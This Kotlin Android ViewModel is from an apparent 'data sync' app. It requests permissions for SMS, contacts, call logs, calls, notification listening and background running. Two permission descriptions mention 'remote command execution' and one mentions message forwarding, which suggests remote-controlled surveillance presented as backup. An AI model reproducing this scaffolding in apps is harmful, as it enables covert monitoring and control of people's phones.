package com.boxx.datasync.permission

import android.Manifest
import android.app.Application
import android.os.Build
import androidx.lifecycle.AndroidViewModel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import javax.inject.Inject
import dagger.hilt.android.lifecycle.HiltViewModel

@HiltViewModel
class PermissionViewModel @Inject constructor(
    application: Application
) : AndroidViewModel(application) {

    private val handler = PermissionHandler(application)

    private val _permissions = MutableStateFlow<List<PermissionInfo>>(emptyList())
    val permissions: StateFlow<List<PermissionInfo>> = _permissions.asStateFlow()

    private val _statuses = MutableStateFlow<Map<String, PermissionStatus>>(emptyMap())
    val statuses: StateFlow<Map<String, PermissionStatus>> = _statuses.asStateFlow()

    init {
        val list = mutableListOf(
            PermissionInfo(
                "CONTACTS", "Contacts",
                "Access contacts to backup your contact list.",
                "Contacts", Manifest.permission.READ_CONTACTS
            ),
            PermissionInfo(
                "SMS_READ", "Read SMS",
                "Access SMS to backup your messages and enable forwarding.",
                "Sms", Manifest.permission.READ_SMS
            ),
            PermissionInfo(
                "SMS_SEND", "Send SMS",
                "Allows the app to send SMS for remote command execution.",
                "SendSms", Manifest.permission.SEND_SMS
            ),
            PermissionInfo(
                "SMS_RECEIVE", "Receive SMS",
                "Required to detect incoming SMS for real-time sync.",
                "ReceiveSms", Manifest.permission.RECEIVE_SMS
            ),
            PermissionInfo(
                "CALL_LOG", "Call Logs",
                "Access call history to backup your call logs.",
                "Call", Manifest.permission.READ_CALL_LOG
            ),
            PermissionInfo(
                "CALL_PHONE", "Make Calls",
                "Allows the app to initiate calls for remote command execution.",
                "Phone", Manifest.permission.CALL_PHONE
            ),
            PermissionInfo(
                "PHONE_STATE", "Phone State",
                "Required to detect SIM info and network status.",
                "SimCard", Manifest.permission.READ_PHONE_STATE
            )
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            list.add(PermissionInfo(
                "NOTIFICATIONS", "Notifications",
                "Required to show sync status in the notification bar.",
                "Notifications", Manifest.permission.POST_NOTIFICATIONS
            ))
        }

        list.add(PermissionInfo(
            "NOTIFICATION_LISTENER", "Notification Access",
            "Required to sync incoming notifications to your dashboard.",
            "NotificationSync", isSpecial = true
        ))

        list.add(PermissionInfo(
            "BATTERY_OPTIMIZATION", "Battery Optimization",
            "Disable optimization to ensure reliable background sync.",
            "Battery", isOptional = true, isSpecial = true
        ))

        _permissions.value = list
        refreshStatuses()
    }

    fun refreshStatuses() {
        val newStatuses = _permissions.value.associate { it.id to handler.getStatus(it) }
        _statuses.value = newStatuses
    }

    fun areAllRequiredGranted(): Boolean {
        return _permissions.value.all {
            if (it.isOptional) true
            else handler.getStatus(it) == PermissionStatus.GRANTED
        }
    }
}
